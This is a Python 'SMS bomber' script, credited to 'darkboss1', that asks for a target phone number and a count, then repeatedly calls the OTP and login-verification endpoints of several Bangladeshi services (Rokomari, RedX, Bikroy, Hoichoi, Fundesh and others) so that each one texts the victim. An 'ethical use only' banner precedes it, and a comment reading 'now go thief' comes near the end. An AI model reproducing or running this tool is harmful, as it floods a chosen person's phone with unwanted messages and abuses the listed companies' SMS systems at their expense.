



import os
import sys
import time


os.system("clear")

print("\n\n\n")
name=input(" \033[1;32m Please enter your name : ")	

os.system("clear")



def style(a):
	for x in a :
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
		
style("\t \t  Loading.........")
	
print("\n\n\n")

time.sleep(1.3)

os.system("clear")


style("\t\t  Loading success")


os.system("clear")

print("\n\n")




style(" \033[1;31m Hey " + "\033[1;33m" + name +" \033[1;31m, Use for ethical perpos only Coded By darkboss1 ")






time.sleep(2)
os.system("clear")

print(""" \033[1;32m





██████   █████  ██████  ██   ██ ██████   ██████  ███████ ███████  ██ 
██   ██ ██   ██ ██   ██ ██  ██  ██   ██ ██    ██ ██      ██      ███ 
██   ██ ███████ ██████  █████   ██████  ██    ██ ███████ ███████  ██ 
██   ██ ██   ██ ██   ██ ██  ██  ██   ██ ██    ██      ██      ██  ██ 
██████  ██   ██ ██   ██ ██   ██ ██████   ██████  ███████ ███████  ██                                                                                                                                              
    
\033[1;36m ==============================

 Creator : darkboss1
 Github  : darkboss1
 facebook: https://www.facebook.com/cybercrackervai/
 
==============================
 
          
\033[1;0m  
     """)







sent=0


try:

	import requests
	

	
	
	def condition():
				global sent
				if response.status_code==200:
					print("Sent success")
					sent=sent+1
				else:
				    pass	
	
	
	am=int(input("Enter Amount : "))
	num=input("Enter target number : ")
	
	
	while sent<=am:
		data = {
		    'emailOrPhone': num ,
		    'countryCode': 'BD',
		}
		
		headers = {
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Referer': 'https://www.rokomari.com',
	    'Origin': 'https://www.rokomari.com',
	}
		
		response = requests.post('https://www.rokomari.com/otp/send', data=data, headers=headers)
		
		condition()
		if sent>=am:
			break
		



#Redx			
		json_data = {
		    'phoneNumber': num,
		}
		
		headers = {
		    'User-Agent': 'Mozilla/5.0',
		    'Content-Type': 'application/json',  # match json= below
		
		}
		
		response = requests.post(
		    'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',json=json_data , headers=headers)
	
		condition()
		
		
		if sent>=am:
			break
		

		#bikroy    
		params = {
		    'phone': num,
		}
		
		response = requests.get(
		    'https://bikroy.com/data/phone_number_login/verifications/phone_login',
		    params=params)
		    
		    
		
		condition()
		if sent>=am:
		  break
		
		
	
#iqra live  	    	    	  	    	

		response = requests.get('https://apibeta.iqra-live.com/api/v2/sent-otp/'+num)

		condition()
		if sent>=am:
		  break
		
		    		    
		    		    		    

		#Hoichoi 
		json_data = {
		    'phoneNumber': '+88'+num,
		}
		
		response = requests.post('https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code', json=json_data)

		condition()
		if sent>=am:
		  break
		


		#Fundesh
		params = {
		    'service_key': '',
		}
		
		json_data = {
		    'msisdn': num,
		}
		
		response = requests.post(
		    'https://fundesh.com.bd/api/auth/generateOTP',
		    params=params,
		    json=json_data,
		)

		condition()
		if sent>=am:
		  break
		


		#rabbithole
		json_data = {
		    'mobile': '+88'+num,
		}

		response = requests.post('https://apix.rabbitholebd.com/appv2/login/requestOTP', json=json_data)


		condition()
		if sent>=am:
		  break
		



#End of api now go thief



except requests.exceptions.ConnectionError:
	    print("Please check your internet connection ")
	    
		    
	    
